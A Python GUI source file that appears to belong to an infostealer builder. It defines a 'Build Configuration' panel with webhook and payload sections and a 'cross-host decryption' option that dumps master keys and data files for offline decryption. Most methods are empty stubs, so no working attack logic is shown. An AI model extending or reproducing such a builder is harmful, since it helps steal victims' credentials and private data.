# gui/builder_panel.py
"""
Builder Panel - Updated with cross-host toggle
"""

import customtkinter as ctk
from tkinter import filedialog, messagebox
import os
import threading
import subprocess

from core.builder import Builder


class BuilderPanel(ctk.CTkFrame):
    """Panel for build configuration."""

    def __init__(self, parent, builder: Builder):
        super().__init__(parent, fg_color="#2b2b2b", corner_radius=8)
        self.builder = builder
        self._build_ui()

    def _build_ui(self):
        self.pack_propagate(False)
        self.configure(width=400, height=650)

        # Title
        ctk.CTkLabel(
            self,
            text="⚙️ Build Configuration",
            font=ctk.CTkFont(size=18, weight="bold"),
            text_color="white"
        ).pack(pady=(10, 5), padx=15, anchor="w")

        self._add_separator()

        # Webhook section
        self._build_webhook_section()

        # Cross-Host toggle
        self._build_cross_host_section()

        # File settings
        self._build_file_settings()

        # Payload settings
        self._build_payload_settings()

        # Build button
        self._build_button()

        # Status
        self.status_label = ctk.CTkLabel(
            self, text="Ready", text_color="#666666", font=ctk.CTkFont(size=12)
        )
        self.status_label.pack(pady=(5, 10))

        self.progress_bar = ctk.CTkProgressBar(
            self, height=8, fg_color="#3b3b3b", progress_color="#a80505"
        )
        self.progress_bar.pack(padx=15, pady=(0, 10), fill="x")
        self.progress_bar.set(0)

    def _build_cross_host_section(self):
        """Build cross-host toggle section."""
        frame = ctk.CTkFrame(self, fg_color="transparent")
        frame.pack(fill="x", padx=15, pady=5)

        ctk.CTkLabel(
            frame,
            text="🔐 Cross-Host Decryption",
            font=ctk.CTkFont(size=13, weight="bold"),
            text_color="#ffffff"
        ).pack(anchor="w")

        self.cross_host_var = ctk.StringVar(value="Disable")
        cross_host_cb = ctk.CTkCheckBox(
            frame,
            text="Enable cross-host decryption (dump keys + archive)",
            variable=self.cross_host_var,
            onvalue="Enable",
            offvalue="Disable",
            fg_color="#a80505",
            border_color="#a80505",
            font=ctk.CTkFont(size=12),
            text_color="#949494",
        )
        cross_host_cb.pack(anchor="w", pady=2)

        info_text = (
            "Extracts master keys and minimal data files.\n"
            "Decrypt offline on any machine using the keys."
        )
        ctk.CTkLabel(
            frame,
            text=info_text,
            font=ctk.CTkFont(size=10),
            text_color="#666666",
            justify="left"
        ).pack(anchor="w", pady=(0, 5))

    def _build_webhook_section(self):
        # ... existing webhook code ...
        pass

    def _build_file_settings(self):
        # ... existing file settings code ...
        pass

    def _build_payload_settings(self):
        # ... existing payload settings code ...
        pass

    def _build_button(self):
        # ... existing build button code ...
        pass

    def _add_separator(self):
        ctk.CTkFrame(self, height=1, fg_color="#3b3b3b").pack(fill="x", padx=15, pady=5)
